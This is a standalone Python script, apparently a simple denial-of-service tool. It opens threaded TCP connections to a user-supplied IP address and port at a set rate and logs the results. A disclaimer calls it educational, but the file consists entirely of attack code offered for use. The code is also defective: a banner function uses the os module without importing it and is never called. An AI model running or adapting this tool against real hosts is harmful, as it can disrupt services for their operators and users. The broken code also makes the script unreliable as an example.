import  socket
import  threading
import  time
import  argparse
import  logging

def display_banner():
    banner = r"""

    ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
    ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░
    """
    os.system('clear' if os.name == 'posix' else 'cls')  # Clear the terminal screen
    print(banner)


# Set up logging
logging.basicConfig(filename='ddos.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def attack(target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, target_port))
        logging.info(f"Connected to {target_ip}:{target_port}")
        s.close()
    except socket.error as e:
        logging.error(f"Error: {e}")

def start_attack(target_ip, target_port, num_threads, rate_limit):
    for _ in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()
        time.sleep(1 / rate_limit)

def main():
    print("""
    DISCLAIMER:
    This script is for educational purposes only. 
    Do not use it for illegal or malicious activities.
    The author is not responsible for any misuse of this script.
    """)

    parser = argparse.ArgumentParser(description="DDOS Script for Educational Purposes")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--rate", type=int, default=5, help="Requests per second")
    args = parser.parse_args()

    start_attack(args.target_ip, args.target_port, args.threads, args.rate)

if __name__ == "__main__":
    main()